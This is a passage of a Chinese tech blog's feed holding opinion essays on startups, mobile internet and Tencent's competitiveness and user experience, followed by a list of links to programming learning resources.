<p>上新浪微博看看，全是什么XXCTO，XXCEO，XX创始人，XX总监，XX高级主管……title要多牛有多牛，但可惜的是也就是个名称罢了，我花10元钱也可以为自己印一盒要有多牛就有多牛的名片。那些用人经理和猎头只会问，你职位是什么啊？你管多少人啊？好像是个高级主管，管上几十上百人就很牛似的。可是，你用这个title和这些人做了什么事啊？这就像我质问Thoughtworks和敏捷人士们一样，你们用这些所谓NB的东西做了什么大事啊？！（注意：我不是说，挣多少钱和职位发展不重要，我只是说，相对于做什么事，怎么做事来说，这些都是其次重要的，只要做的事靠谱，报酬和职业都会得到的）</p>
<p>好吧，让我再回到创业的话题上来，<strong>有一本书叫“<a href="https://book.douban.com/subject/3889178/" target="_blank">Rework</a>”，想创业的朋友可以好好读一读</strong>。“保持 小的公司规模，你不需要加班，你没有必要耗尽你一生的积蓄，承担财务风险。你可以一边继续日常工作，一边开始创业，这样随时都能有现金满足需要。你甚至不需要办公室。现在可以在家工作，和从未见面离你千里之外的人合作…… ” 这是一本让你可以去思考的书，远比那些名人们的微博有价值地多得多。<strong><span style="color: #cc0000;">不要跟随大流，保持住内心的理想，Think it Big, Make it Different</span></strong>。</p>
<p>我没有能力去诠释人活着是为了什么。但就我而言，我认为应该在自己那短暂的人生内能去多经历更多一些有意义事情，能多做一些更有意义的事情，人生太短了，人太容易变了，时间，精力和人性都经不起折腾。只要做的事有意义，跟着别人一起去开创事业未尝不可，开公司又不是什么时尚。所以，如果你是一个做事的人，我觉得，不要去盲目地创业，那是在浪费时间，潜下心来，观察，思考，尝试，积累，就像一只在非洲草原上匍匐前缓缓逼进猎物的狮子那样有耐心。<span style="color: #cc0000;"><strong>把自己当成一个沉着稳重猎手，而不是战场上的炮灰</strong></span>。</p>
<h4>
<span class="ez-toc-section" id="%E7%A7%BB%E5%8A%A8%E4%BA%92%E8%81%94%E7%BD%91"></span>移动互联网<span class="ez-toc-section-end"></span>
</h4>
<p>我不知道大家怎么看这个名词的。这是个当今巨火无比的词儿。有人跟我说过一个段子，某中国大公司的研究所的某某研究员是做出了这样的口沫横飞的定义——“移动互联网绝对是个了不起的东西，因为互联网是移动互联网的子集，因为静止是相对的，移动是绝对的，所以移动互联网必然是未来的一切……”。领导的讲话真是没得说，你我都不可能说出来这样的话。</p>
<p>在我眼中，互联网才是核心，移动只不过是互联网的补充，只不过是为了让互联网有更好的体验。今天，全世界都打鸡血似地开发移动应用，我仿佛看到当年Windows平台出现的时候，大家都在Windows上写一些小软件一样。不可否认其中是有一些很不错的应用，也不可否认苹果的App Store让这些“软件个体户们”有了更好的创作平台，而软件质量也显著提高。但是更多的应用都会像Windows平台上的那些小软件一样，必然会很快被淹没在历史大潮之中。没有后面互联网和实际业务的强力支持，移动上的应用也就是一些小打小闹的东西。今天移动互联网的热，就像10年前.com的热一样，我看到移动互联网中像当年.com那样大量的泡沫。我看到各种创业团队和投资一涌而上，而我们都知道，<strong>当潮水退却的时候，就可以看到哪些人在裸泳了</strong>。</p>
<p>今天的移动设备和当年的PC机何其相似，真正制定规则的人都是那些在制造移动设备及其操作系统的公司。当年在Windows上有很多不错的共享软件，什么foxmail，netants，cuteftp，…… 我记得当时foxmail被以2000万收购，但是今天也就这样了，邮件都都在Web或是移动端收了。我相信今天在这些在移动设备上开发应用的创业团队，很有可能也会在5到10年之后面临着相同的尴尬（可能会更短）。我倒不是说这样的小软件没意思，我只是想说，这样的小软件的开发完全没有必要成立公司，要成立公司，就应该要干得比这个事要大。不是吗？难道你不想创建一个能比自己寿命还长的事业和公司吗？移动互联网上的很多小应用，更像是大学里学生们开发着玩的一些软件玩具罢了。</p>
<p>移动互联网上很多app感觉特别无聊，比如foursquare, 街旁之类的东西，虽然我实在不能理解这样的东西为何流行，但我想起了我6年前（2005年），当blog出现的时候，我在MSN的BLOG上记录<a href="http://blog.sina.com.cn/s/blog_538efefb0100n53e.html" target="_blank">过自己的一些粗糙的想法</a>（现在搬到了新浪Blog）。当时我认为，<strong>互联网的进化和人类社会的进化很相似，web1.0 到 web 2.0，就是从“自由”到“自我”的一个过程。</strong>今天，我们看到了 “自我”这个过程的各种各样的演绎，也许，像这种地理位置签到的玩意儿同样满足了人们那种“自我”的渴望。不过，我们都可以看到今天互联网上“自我”的泛滥，人们在网上晒各种各样自己的东西，在豆瓣上展示自己读过的书，看过的电影，在微博上晒自己的旅行照片，生活点滴，自己的车子房子老婆孩子，公司，职位，简历，加V，衣食住行，吃喝拉撒，等等一切可以拿出来炫耀的东西，包括自己的地理位置。我想到了“自我”，但我万万没有想到自我的东西里还包括自己的位置。<strong>这些不创造任何价值的自我的东西终将是过眼云烟，昙花一现</strong>。<strong>我们都得问问自己这个问题——我们有没有在创造价值</strong>？！（也许这个话说得有些绝对了，对于中国人来说，这是我们的culture啊。另外，我意识虚荣和炫耀并不产生价值是错的一一GMM的事给了我一记漂亮的耳光。试想，当今这个社会，如果所有的二奶都来炫耀谁包养了她，官员们都能签到他们出入的位置，那么还是能创造很多价值的。滑稽吧）</p>
<p>今天，我大胆预测一下未来互联网的走势，只有了解历史，我们才能看清未来。</p>
<ul>
<li>
<strong>互联网的精髓是自由和分享</strong>。这个东西以前是这样，现在也是这样，未来还是这样。就算是我们正在经历那些反人类的东西。但这个精神和趋势必然是无法阻挡的。我们在网上没有边界地分享我们的数字信息，或公开，或私密，无论是我的发邮件，写博客，织微博，还是看视频，听音乐，写评论。都是自由和分享的体现。移动互联网会把这个事体现到极致。</li>
</ul>
<ul>
<li>
<strong>互联网的本质是信息组织</strong>。关于信息，以前是ICP发布信息，现在是ICP feed信息(订阅)，大众参与组织信息。但是都会有一个问题，那就是信息太多，等于没有信息。搜索引擎的出现部分解决了这一问题。但没有解决彻底。因为搜索出来的东西还是太多，而且是搜索引擎的单一标准，而不是个体差异和喜好的标准。所以，<strong>我觉得未来的信息必然要走个性化的路。搜索引擎或是别的平台（如豆瓣，电子商务等）会学习用户的习惯和喜好，然后根据用户的喜好出现不同的结果。这就是所谓的推荐</strong>！<strong>未来必然是推荐的时代</strong>。</li>
</ul>
<p>所以，对于移动平台，我觉得最有价值的就是这些事情：1）<strong>阅读</strong>（如：kindle，新闻，图书，订阅等），2）<strong>分享和交流</strong>（如：facetime，iMessage，微信，米聊，电邮等等），3）<strong>电子商务</strong>（如：机票酒店餐饮购物），4）<strong>推荐</strong>（目前这一块还是比较空的）。注意，我们需要清楚地认识到，其中的分享和交流是对传统电话和短信的延续，并不是取代！有些时候，本来直接打个电话发个短信就解决了的事，我们还要让用户上我们的平台，这就没有意义了。</p>
<p>哦，你会问我，云计算在哪里？云嘛，在天上漂着呢，尤其是中国的各种云。我不知道你还记不记得前几年的“网格计算”？现在真的成浮云了。不要去追随着那些媒体们热捧热炒的东西，<strong>中国的科技媒体们一来只会跟产商，二来他们哪有你懂技术懂产品啊</strong>。所以，不要被他们吹晕了，不知道自己该干什么了。还是想一想，你要解决什么问题，关注这些名词或代号没有意义。</p>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E5%B0%BE"></span>结尾<span class="ez-toc-section-end"></span>
</h4>
<p>最后，我要说明一下，本文是我思考了十天左右的文章，不存在喝多了，也不存在凌晨写作头脑不清的问题，也不存在本来要把一篇给小范围传播的文章给大家看。对于我在文中批评的那些公司，我希望他们能把我的这些rant当成一种建议和鞭策，当然，你们需要适应我调侃和尖锐的语气。千万不要学那些敏感人士，或是黑我的blog，或是骂人，因为这样只会让你们看上去更为难堪。</p>
<p><span style="color: #cc0000;">最后注明一下版权，<strong>本文由陈皓原创发表，你可以任意传载，但必需在明显位置注明作者和出处，而且不能用于任何商业用途</strong>。</span></p>
 ]]></content>
<pubDate>2011-11-15T08:31:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/5815.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 腾讯，竞争力 和 用户体验 ]]></title>
<link>https://coolshell.cn/articles/5901.html</link>
<content><![CDATA[ 
<p>自从<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html" target="_blank">那篇rant了一堆公司都的文章</a>发布来，得到了大家的关注，有些朋友让我写一下腾讯，在我的微博上（<a href="https://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）还有位腾讯的朋友让我也评价一下腾讯。本来不想写的，觉得腾讯没啥好说的，但是因为下面的几个原因，让我有点坐不住了：</p>
<ol>
<li>这两天知乎上的一个“<a href="https://www.zhihu.com/question/19920338" target="_blank">腾讯的核心竞争力</a>”的贴子在微博上被很多人所推崇。</li>
<li>还有一个网友发邮件给我说让我别rant了，宁可C2C也比rant有意义。</li>
<li>我周末的时候去豆瓣和他们交流了一些关于产品和用户体验方面的话题。</li>
<li>还看到了Jeff Bezos的访谈文章《<a href="http://tech.sina.com.cn/i/2011-11-17/15546337096.shtml" target="_blank">贝佐斯：亚马逊是科技界唯一一家低利润公司</a>》</li>
</ol>
<p>于是就有了这篇文章，但不想再rant了，我希望这篇文章更有价值一些，但是我喜欢的调侃的风格依然，因为这是我觉得能让文章有趣味的方式。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%85%BE%E8%AE%AF%E7%9A%84%E4%BB%B7%E5%80%BC" title="腾讯的“价值”">腾讯的“价值”</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%85%BE%E8%AE%AF%E7%9A%84%E6%A0%B8%E5%BF%83%E7%AB%9E%E4%BA%89%E5%8A%9B%E4%B8%80%E6%96%87" title="“腾讯的核心竞争力”一文">“腾讯的核心竞争力”一文</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%85%BE%E8%AE%AF%E7%9A%84%E8%BD%AF%E8%82%8B" title="腾讯的软肋">腾讯的软肋</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C" title="真正的用户体验">真正的用户体验</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%85%BE%E8%AE%AF%E7%9A%84%E4%BB%B7%E5%80%BC"></span>腾讯的“价值”<span class="ez-toc-section-end"></span>
</h4>
<p>首先我想说说腾讯的价值。根据我<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html" target="_blank">那篇 rant 的文章</a>来说，我觉得人要活得有价值，事业也要做得有价值。我不太待见那些没有价值的东西。所以，我在那篇文章里让大家都思考了一个问题，我们做这个事的价值在哪里？所以，要评论腾讯，就得想想他的价值。众所周知，腾讯的起家是通过IM软件QQ，当然，他有段时间几乎快不行了。不过挺过来了，造就了这么一个帝国。所以，腾讯的价值应该是即时通讯，让大家的沟通变得更顺畅，这点腾讯的确做得非常强大，视频，音频，涂鸦，抓屏，表情，Q币，共享，群聊，新闻，弹窗，离线文件，远程协助…… 的确做得非常地体贴用户。除了扫描硬盘文件有点那个。</p>
<p>但是，最近的腾讯变了（当然有人说他也没有变，QQ本来就是抄来的），有什么就抄什么，没有创意，山寨大王，成了腾讯的代名词。马云也说过：“现在腾讯拍拍网最大的问题就是没有创新，所有的东西都是抄来的”。网上还有很多，什么“一直在抄袭，从未超越过”或是“<a href="https://weibo.com/2093492691/xwYpFB9IK" target="_blank">一直在山寨，从没反省过</a>”等等的话，还有“<a href="http://tieba.baidu.com/f?kz=1007979914" target="_blank">自从有了XXX，腾讯就出了XXX</a>”的文体。</p>
<p><strong>但是，你们都错了，包括马云，我不同意你们，我觉得这正是腾讯的价值所在</strong>。</p>
<p><span id="more-5901"></span></p>
<p>昨天有个网友写邮件给我说，整天rant也没啥意思吧，还不如真的做点C2C吧。他的想法是先把一些基本的东西如评论，发贴，头像，登录什么的都做好，然后国外出什么就抄什么，抄的会飞快。我给他回信说，你抄得过腾讯吗？他无语了。你看，一个有C2C想法的人就这样被放弃了其想法。所以，我觉得，<strong>腾讯这样大规模的抄袭和山寨，对整个社会的价值就是——<span style="color: #cc0000;">会让很多很多的创业团队放弃Copy，甚至让他们要放弃那些容易被复制的“业务型的项目”，而逼着他们去努力思考，如何才不能被腾讯复制，如何才能有自己的核心价值</span></strong>。而所有的骂名都被腾讯所承当，腾讯把住了所有的茅坑，让你不得不去做最有价值的东西，这是一种什么样的精神啊？！对于那些整天都在骂腾讯的人来说，你们好好地去面壁反思吧！</p>
<h4>
<span class="ez-toc-section" id="%E8%85%BE%E8%AE%AF%E7%9A%84%E6%A0%B8%E5%BF%83%E7%AB%9E%E4%BA%89%E5%8A%9B%E4%B8%80%E6%96%87"></span>“腾讯的核心竞争力”一文<span class="ez-toc-section-end"></span>
</h4>
<p>顶在<a href="https://www.zhihu.com/question/19920338" target="_blank">这篇文章</a>最上面的最佳答案是腾讯无线国际业务产品总监Andy Pan的答案，在微博上也广受推崇。不知道为什么，我总是有一些和大家不一样的想法，看来我是一个有相当逆反心理的愤青。没做出什么东西来，话还挺多，我都有点烦自己了，你也多多原谅我。</p>
<p>Andy Pan的答案中，说了两点核心竞争力，第一个是腾讯的IM平台，还用了Windows来做比较，很明显，这个前微软件的产品总监并不知道什么是平台，关于平台，<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">Steve Y的这篇平台论</a>说得很清楚了，建议Andy同学学习一下。Windows之所以是个平台的原因是因为Windows没有什么都做，而是开放了很多很多的API和SDK让第三方的产商去做，而腾讯并没有开放IM的API，不但搞定了珊瑚虫，而且什么事情都要自己做，这根本不是平台，平台是要去开放的，是要去为业界创造生态环境的，而腾讯的做法更像是封闭的垄断。当Andy Pan说起Amazon收购Zappos的时候，他忘记了Amazon的云平台上还养了一个巨大的竞争对手Target（最近分手了），还养了十年。因为，Bezos觉得有个竞争对手和自己进行良性的竞争对自己是有好处的。</p>
<p>Andy还说做为一个IM细分用户的领域是有必要的，没错，完全赞同。不过，实在看不出来对领域的细分，更多的是对领域的扩张。新闻门户，搜搜，拍拍，百科，Q吧，炫风，炫舞，三国，英雄杀，浏览器，输入法，对战平台，电台，影音，图书，阅读，3366，QQTalk…… 一点都看不出来的是对IM的细分。你信吗？</p>
<p>第二个Andy说的核心竞争力是员工加班。加班到深夜也成了核心竞争力，看来是实在找不到核心竞争力了。好吧，我觉得这句话可以说得更好一些，再怎么也应该说成是企业文化，或是企业文化催人奋进，每个人都有主人翁的精神，而不是工作负荷大嘛。你看，我都能说的这么漂亮啊，我才是像高管的样子哦，吼吼。对我来说，加班文化是差团队的表现，要么就是管理不行，让大家都加班，要么就是自己不行（反正肯定有问题，我在<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多些时间能少些代码</a>里论述过了）。当然，我知道了，腾讯的战线拉得很长，什么都要做，当然会那么累了，要学会做精不要做多嘛。</p>
<p>作为一位高管，应该要知道，重要的不是你有多努力，你花了多少时间，而是你有没有去思考，有没有去创造价值。<strong>腾讯难道不觉得，不断地创新去颠覆传统才是互联网行业的核心竞争力吗</strong>。</p>
<p>我觉得腾讯那所谓的核心竞争力是用户数量大，大在关系链上，像我这样几本不用QQ的人有时候都会被朋友和同学逼着去用QQ收个文件照片或是远程协助个什么。QQ这个聊天工具做得非常不错，这点我是要赞一下的。所以，这才让用户聚集起来，没有了这个，不知道腾讯会怎么样。</p>
<h4>
<span class="ez-toc-section" id="%E8%85%BE%E8%AE%AF%E7%9A%84%E8%BD%AF%E8%82%8B"></span>腾讯的软肋<span class="ez-toc-section-end"></span>
</h4>
<p>Andy Pan有一点说的是对的，就是腾讯和微软很像，不过像的不是平台，而是运营模式——那就是永远跳不出自己的模式。微软不管做什么，都必需誓死捍卫其Windows平台，连那么有创造力的体感硬件Knect也只能用在微软的产品和平台上，更不用说hotmail，Bing和Sharepoint了，如果能开放一些用点别的技术，我相信微软在互联网界可能还是很强大的。</p>
<p>腾讯也逃不出“腾讯的模式”——那就是<strong>大量的低端业务和低端内容</strong>。我不确定腾讯是不是像微软那样誓死捍卫其低端业务和内容的。但是QQ的确驱逐了很多高质量的用户，因为QQ上的不成熟的小孩太多了，交友，网恋，甚至欺骗和色情在那里泛滥，造成劣币驱逐良币。另外，QQ这个名词起得很不好，因为正常点的成年人都不会去Q（装可爱），所QQ好像也就成了未成年人的代名词。而似乎有自我价值诉求的人都不会用QQ，在正式场合比如自己的应聘简历上留一个QQ邮箱还是有点掉价的。可见QQ的这个品牌形象很低端。腾讯的很多产品都走的都是这个路线。</p>
<p>不可否认，这和中国网民的群体素质有关系。但我以为，<strong>作为那么大的公司，应该担负起培养或引导网民素质，开启民智，引人向上的角色，而不是将就于低端的大众用户</strong>。</p>
<p>另外，还值得一提的是近来关于通过QQ抓人的新闻很多，所以，大家都知道的为什么更多的用户去用gtalk了。不过有一点应该是真的，那就是通过QQ监控聊天用户的体验，应该是很不错的。</p>
<p>看到这里，你一定会对我抱怨说：“我擦，你这篇还照旧是一篇rant，fuck你一万遍”。别骂了，你没有看我已经赶快起了一个新段落来说点我觉得有点价值的东西。</p>
<h4>
<span class="ez-toc-section" id="%E7%9C%9F%E6%AD%A3%E7%9A%84%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C"></span>真正的用户体验<span class="ez-toc-section-end"></span>
</h4>
<p>说起用户的体验，这是一个可能比较大的，也可能比较具体的话题（以前本站有一篇<a title="用户界面和用户体验的差别" href="https://coolshell.cn/articles/3142.html" target="_blank">关于UX比喻的文章</a>）。关于用户体验来说，很多人都以为是对UI的一个加强，也就是说把UI的操作做得更好。所以，大家都在UI上花大力气做UX。这样的认识并不错，QQ做得也是非常好的，看看WebQQ，真是非常地强大。</p>
<p>不过，我想说，<strong>如果你认为用户的体验在UI上，那么你只看到了用户体验的冰山一角，用户的体验远远不只这个</strong>。“<strong>任何表面上的东西都是肤浅的</strong>”——这是写Effective C++的Scott Meyers说的。</p>
<p>你看——Reddit，Twitter，StackOverflow， 还有国内的豆瓣，界面做的真的不怎么的，Reddit的界面ugly到了就像是一个没有完成的原型网站一样！但是为什么人家的用户人气那么旺，为什么呢？</p>
<p>这就是我想说的比UI更高层次的用户体验了——<strong>关注用户的真正的体验</strong>。我先举个例子——</p>
<blockquote><p>大家知道Amazon注册了很多个容易让人打错的域名吗？我这里有一个不完整的列表：Amamzon.com， Amaxon.com，Amazong.com，Amozon.com，Amazonc.com，Amazone.com，Amazn.com（翻墙），namazon.com…… 为的都是用户体验。（注：你要是用拼音也可以，如：yamaxun.com）</p></blockquote>
<p>这是一个很小的例子，旨在说明用户体验不单单是UI的事。</p>
<p>下面正式阐述真正的用户体验（这些东西我在前面<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html" target="_blank">那篇rant里提过了</a>，这里说得更细一点）——</p>
<ul>
<li>
<strong>注重社区的质量</strong>。很多论坛和网站的兴起都是因为一开始有高质量的文章和素质高的人，然而，人气一足，三教九流的人都来了，于是劣币逐良币，那些素质高的人就只能离开了。所以，任何把高质量和低质量的东西放在一起的社区相当的破坏整体用户体验。尤其是那些对质量有诉求的人。为了避免劣币逐良币，大家要学习一下豆瓣，StackOverflow，没有什么热文版，就算有，也要精心地控制内容的质量。<strong>你要知道，人们来这里是因为被这个社区有价值的东西吸引来的</strong>。就像是去StackOverflow或Quora一样，可以得到很靠谱的答案，可以和很牛的人在一起交流，这是社区的价值。所以，像StackOverflow或Quora这样的网站，一些质量不高的答案在那里就会被投反对票，其会影响你的reputation。看看Amazon.com上的书评，IMDB上的影评，非常专业，还有打分，高质量的东西自然就浮出来了，低质量的东西自然就下降了。<strong>小心维护社区的质量必然会给用户有更好的体验</strong>。（不知道大家有没有参加过豆瓣的小组活动，我有一个朋友参加过一次关于绘画的活动，说是质量相当高）</li>
</ul>
<ul>
<li> <strong>注重社区的权威</strong>。像豆瓣或是Stackoverflow上都有评分。你怎么能让你的评分有权威性呢？你知道，在中国这块土地上有大量的五毛和水军，他们随时都可以开动，3Q大战的时候大家都见识过了，对于这些牛皮癣怎么办呢？在Stackoverflow上，你会发现，你没有15点reputation，你没有资格vote什么，你为了要能去vote什么，你先得贡献些什么，对于不懂技术的五毛和水军们完全搞不定这些东西了（当然，你可以去建一个问题，但是要小心被down vote）。对于豆瓣来说，豆瓣的每个用户都有个权威值，这个值通过用户的在线时间，发贴数量，访问次数，有没有高质量的文章，有没有参加社区活动，等等等因素，得出一个权威值。刚注册的用户权威值为0，如果有了一些负面的东西还有可能是负数，有些被社区所推崇的牛人级的用户的权威可能高达几千几万。这样，当水军和五毛们对一本书或是一个电影投票的时候，就算是数量大，但基本上没有什么作用。这就是为什么豆瓣里有的电影有70%的人投了三分或四分，但那个电影还是在快5分的样子。这就是为了维护社区的权威和质量的体现。淘宝的好评差评也是一样，但是如果可以被水军去冲的话，那就很没有意思了。看看大众点评网里的那些评论，很多都完全失去了权威。因为他们没有vote的机制。</li>
</ul>
<ul>
<li>
<strong>注重用户的个性化，并引导用户</strong>。登录进入Amazon或豆瓣或是新浪微博，在首页上，你会看到你所关注的东西。整个首页是为你个人量身定制出来的。这样一来，就算这个社区里有什么流氓或是低端用户，那也不会影响用户的体验（新浪微博的隐私设置也是很不错的）。最注要的是，这让为引导用户，开启民智做了充分的准备——这就是推荐。Amazon是推荐算法的鼻祖。推荐书，推荐产品的邮件，页面定制，等等。Henry Ford 说过——“如果你问用户想要什么，他们会告诉你要一匹更快的马”，看看苹果的设计出来的产品，都是在引导用户，如果你只看到了苹果的UI，那只看到了一部分。苹果开发的东西都在引导用户认可和追逐有艺术气息的数码产品。所以，<strong>根据用户的特征来向用户推荐并引导用户，告诉用户什么是好的，什么是有价值的，才是真正的用户体验</strong>。</li>
</ul>
<div>
<ul>
<li>
<strong>把事变简单，把难度降低</strong>。还记得以前的PC上的Windows吗？还记得以前的个人主页，现在的blog吗？他们可以让更多的人会更容易地操作电脑，发布信息。看看苹果的iPad，其可以让一个5岁的孩子或是60岁的没的接触过电脑的老人在5分钟内学会使用电脑上网浏览。这意味着什么？这意味着会使用电脑的人越来越多；可以让更多的人发布自己的信息。<strong>这意味着什么？这意味着金字塔低端的人会越来越多，于是生态环境也会越来越好</strong>。<strong>对于业务来说，你需要给予end-to-end的服务。</strong>就像苹果一样，你不要担心买来电脑怎么去装软件，去下载音乐和电影，也不必担心会装上恶意的软件。就像Amazon的第三方商户平台，对于商户来说，你把货发给Amazon就好了，你不必担心库存，物流，客服，退货，财务，所有的一切都由Amazon代劳了。这些东西才是最强悍的东西。（腾讯的QQ也是让很多人能上网聊天，降低了网聊的难度，所以也流行了起来）</li>
</ul>
<p>上面的这四点真正的用户体验，腾讯有没有做到？你有答案的。老实说，腾讯的用户体验只做了些很表面的东西。</p>
<p>最后，让我用我东家老大的话来结束这篇文章—— <strong></strong></p>
<blockquote>
<p>“我们对于完美客服体验的理解是，用户其实并不希望与我们直接对话。每次客户联系我们，我们都视为工作中的失误。我已经说了好多年了，人们应该与他们的朋友交谈，而不是与商家。因此，我们充分利用各种客服信息来探究客户联系我们的真正原因。什么地方出现问题了？那个人为什么要打电话？为什么他们花费时间与我们交谈而不是与家人交谈？我们如何解决这个问题？”</p>
<p style="text-align: right;">—— Jeff Bezos</p>
</blockquote>
<p style="text-align: center;"><strong>尊重用户，提高品质，不断创新——这才是互联网企业的核心竞争力！</strong></p>
<p style="text-align: left;"><span style="color: #cc0000;">最后注明一下版权，<strong>本文由陈皓原创发表，你可以任意传载，但必需在明显位置注明作者和出处，而且不能用于任何商业用途</strong></span>。</p>
</div>
<p></p>
 ]]></content>
<pubDate>2011-11-22T08:29:24+08:00</pubDate>
<guid>https://coolshell.cn/articles/5901.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些文章资源和趣闻 ]]></title>
<link>https://coolshell.cn/articles/5537.html</link>
<content><![CDATA[ 
<p>下面是我这段时间来收集的一些有意思的东西。本站这样的文章还很多，如<a title="一些文章和各种资源" href="https://coolshell.cn/articles/5224.html" target="_blank">这个</a>，<a href="https://coolshell.cn/articles/3013.html" target="_blank">这个</a>，<a href="https://coolshell.cn/articles/3903.html" target="_blank">这个</a>。</p>
<p>Javascript Garden，这是学习Javascript最好的网站了。<a href="https://bonsaiden.github.com/JavaScript-Garden">http://bonsaiden.github.com/JavaScript-Garden</a>，这个文档由两具StackOverflow的人写成, <a href="https://stackoverflow.com/users/170224/ivo-wetzel">Ivo Wetzel</a>(Writing) 和 <a href="https://stackoverflow.com/users/313758/yi-jiang">Zhang Yi Jiang</a> (Design)，表示敬意。</p>
<p>想看看Web开发有哪些技术吗？你得看看这个网站：<a href="http://stackparts.com/">http://stackparts.com/</a>，他对目前几乎所有Web上用得到的技术都分了个类。下面是个抓图。</p>
<p><a href="http://stackparts.com"><img alt="image placeholder" ></a></p>
<p>Mozilla的安全编程规范 <a href="https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines">https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines</a> <a href="http://research.microsoft.com/apps/dp/sq.aspx?a=47204&amp;sq=dl#a=!77148!80820!132314!81593!77135!103269!77072!138731!77112!131133!149403!77128!78088!143130!77023!139171!138997!141118&amp;p=1&amp;ps=36">Downloads associated to Software development</a></p>
<p>PHP,Perl, Ruby, Python语法比较<a href="http://hyperpolyglot.org/scripting?utm_source">http://hyperpolyglot.org/scripting?utm_source</a></p>
<p><span id="more-5537"></span></p>
<p>图形游戏编程的电子书 <a href="http://ploobs.com.br/?p=766">http://ploobs.com.br/?p=766</a></p>
<p>图形编程黑皮书：<a href="http://drdobbs.com/high-performance-computing/184404919" target="_blank">http://drdobbs.com/high-performance-computing/184404919</a></p>
<p><a href="http://www.dpfiles.com/dpfileswiki/index.php?title=Black_Art_of_3D_Game_Programming:_Writing_Your_Own_High-Speed_3D_Polygon_Video_Games_in_C" target="_blank">Black Art of 3D Game Programming: Writing Your Own High-Speed 3D Polygon Video Games in C </a></p>
<p>想学设计模式吗？这是一个非常好的网站：<a href="http://www.vincehuston.org/dp/">http://www.vincehuston.org/dp/</a> 以元素周期表的形式把23个经典模式列出来，让我想到了这几天在看的美剧Breaking Bad，呵呵。</p>
<p><img alt="image placeholder" ></p>
<p>Learn C the Hard Way <a href="http://c.learncodethehardway.org/book/" target="_blank">http://c.learncodethehardway.org/book/</a></p>
<p>Learn Ruby the Hard Way <a href="http://ruby.learncodethehardway.org/book/">http://ruby.learncodethehardway.org/book/</a></p>
<p>Learn Python the Hard Way <a href="http://learnpythonthehardway.org/">http://learnpythonthehardway.org/</a></p>
<p>Learn SQL the Hard Way <a href="http://sql.learncodethehardway.org/book/">http://sql.learncodethehardway.org/book/</a></p>
<p>Linux基础学习：</p>
<ul>
<li><a title="Linux Fundamentals, Part 2" href="http://www.funtoo.org/wiki/Linux_Fundamentals,_Part_1" target="_blank">Linux Fundamentals, Part 1</a></li>
<li><a title="Linux Fundamentals, Part 2" href="http://www.funtoo.org/wiki/Linux_Fundamentals,_Part_2">Linux Fundamentals, Part 2</a></li>
<li><a title="Linux Fundamentals, Part 3" href="http://www.funtoo.org/wiki/Linux_Fundamentals,_Part_3">Linux Fundamentals, Part 3</a></li>
<li><a title="Linux Fundamentals, Part 4" href="http://www.funtoo.org/wiki/Linux_Fundamentals,_Part_4">Linux Fundamentals, Part 4</a></li>
</ul>
<div>相了解GIF吗？这里有篇不错的文章：<a href="http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp" target="_blank">http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp</a>
</div>
<div>如何在PC上通过VirtualBox装一个Android操作系统。 <a href="http://www.javacodegeeks.com/2010/06/install-android-os-on-pc-with.html" target="_blank">http://www.javacodegeeks.com/2010/06/install-android-os-on-pc-with.html</a> 不过这篇文章有点老了，是去年的，最新的方式是使用<a href="http://www.android-x86.org/" target="_blank">Android-x86</a>这个项目。</div>
<p>一些你可能不知道的git的tips：<a href="http://mislav.uniqpath.com/2010/07/git-tips/">http://mislav.uniqpath.com/2010/07/git-tips/</a></p>
<p>一个给C/C++程序员用的Vim Plugin，我试用了一下，不是很好用。不过也许你会喜欢：<a href="http://www.fortystones.com/vim-plugins-c-cplusplus-developer/">http://www.fortystones.com/vim-plugins-c-cplusplus-developer/</a></p>
<p>数独游戏的程序算法，140个字节的一段javascript程序： <a href="https://gist.github.com/1230481/95f6facb74f51d089bea87eba0f470cf3bbed83a" target="_blank">https://gist.github.com/1230481/95f6facb74f51d089bea87eba0f470cf3bbed83a</a></p>
<p>一个教你用HTML5做一个画图版的教程：<a href="http://www.primaryobjects.com/CMS/Article134.aspx">http://www.primaryobjects.com/CMS/Article134.aspx</a> 其示例在这里 <a href="http://www.primaryobjects.com/paint/">http://www.primaryobjects.com/paint/</a></p>
<p><img alt="image placeholder" ></p>
<p>这里又是一个HTML5的演示 <a href="http://www.spielzeugz.de/html5/sticky-thing/">http://www.spielzeugz.de/html5/sticky-thing/</a>，一个物理的会粘在浏览器边框上的小方块，在iPad里演示相当有意思。只是其代码好像被搞得非常地不易读，不过，你可以试试这个工具来整理代码：<a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a>，但是变量命名还是会让你毫无头绪。</p>
